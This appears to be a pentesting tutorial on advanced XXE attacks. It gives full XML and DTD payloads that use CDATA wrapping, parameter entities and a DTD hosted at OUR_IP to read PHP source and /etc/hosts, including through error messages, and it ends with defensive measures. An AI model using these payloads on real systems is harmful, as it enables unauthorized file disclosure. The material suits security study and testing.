
# Advanced XXE Exploitation Techniques

## 🧠 Overview

Some files cannot be directly displayed inside XML because their contents break XML parsing.

Examples:

- HTML  
- PHP source code  
- Special characters (`<`, `>`, `&`)  

➡️ To handle this, advanced XXE techniques use:

- CDATA wrapping  
- Parameter entities  
- Error-based exfiltration  

---

# 🔥 Advanced Exfiltration with CDATA

## 🧩 What Is CDATA?

CDATA tells the XML parser to treat content as raw text.

Example:

```xml id="4tqrv4"
<![CDATA[
RAW DATA HERE
]]>
````

➡️ Special characters are not interpreted as XML

---

# ⚠️ Problem

Directly combining:

* Internal entities
* External file entities

is restricted by XML parsers.

---

# 🚀 Solution: Parameter Entities

Parameter entities use `%` instead of `&`.

They allow advanced entity chaining.

---

# 🧪 Local Entity Setup

```xml id="2cvh8m"
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

---

## ⚠️ Limitation

This approach does not work directly because XML prevents joining internal and external entities.

---

# 🔥 Exploitation with External DTD

## 📂 Step 1 - Create External DTD

File: `xxe.dtd`

```dtd id="m2j5jg"
<!ENTITY joined "%begin;%file;%end;">
```

---

## ▶️ Host the DTD

```bash id="3twwkh"
python3 -m http.server 8000
```

---

# 🚀 Step 2 - Send XML Payload

```xml id="bblry9"
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

---

# 💥 Result

The file content is wrapped inside CDATA and safely displayed:

```text id="l6d8q7"
<![CDATA[
PHP SOURCE CODE
]]>
```

➡️ Useful for extracting source code or malformed XML content

---

# 🔥 Error-Based XXE

## 🧠 Overview

Sometimes:

* No XML output is displayed
* No direct entity rendering exists

But the application leaks parser/runtime errors.

➡️ We can abuse these errors to extract file contents.

---

# 🧪 Step 1 - Confirm Error Handling

Break XML intentionally:

```xml id="7dpkop"
<roo>
```

or reference invalid entities.

➡️ If the server displays parsing errors → exploitation may be possible.

---

# 📂 Step 2 - Create Malicious DTD

File: `xxe.dtd`

```dtd id="sj6uqz"
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

---

# 🚀 Step 3 - Send XML Payload

```xml id="ycjwn9"
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

---

# 💥 Result

The parser attempts to resolve:

```text id="tq3e17"
%nonExistingEntity;/FILE_CONTENT
```

➡️ Error message leaks the file contents

---

# 🔍 Why It Works

The XML parser includes the file contents inside the error path.

➡️ Application errors become an exfiltration channel

---

# 🧠 Key Insight

Even if output is hidden:

* XML parsers still process entities
* Errors may reveal sensitive data

---

# 💣 Pentester Mindset

* No output does not mean safe
* Always test parser behavior
* Error messages are valuable attack surfaces
* External DTDs greatly increase XXE impact

---

# 🛡️ Defensive Measures

* Disable external entities
* Disable external DTD loading
* Hide parser/runtime errors
* Use secure XML parsers
* Restrict outbound network access

